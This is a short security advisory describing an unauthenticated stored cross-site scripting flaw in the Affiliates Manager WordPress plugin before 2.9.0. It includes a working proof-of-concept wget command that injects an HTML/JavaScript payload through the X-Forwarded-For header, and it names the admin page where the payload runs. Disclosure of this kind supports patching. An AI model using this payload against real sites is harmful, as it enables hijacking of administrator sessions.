# Affiliates Manager < 2.9.0 - Unauthenticated Stored Cross-Site Scripting
Description

The plugin does not validate, sanitise and escape the IP address of requests logged by the click tracking feature, allowing unauthenticated attackers to perform Cross-Site Scripting attacks against admin viewing the tracked requests.

# Proof of Concept
```
As unauthenticated: wget "https://example.com/?wpam_id=1" --header="X-Forwarded-For: <img src onerror=alert(/XSS/)>" -q -O-



The XSS will be triggered when an admin access http://example.com/wp-admin/admin.php?page=wpam-clicktracking 
```
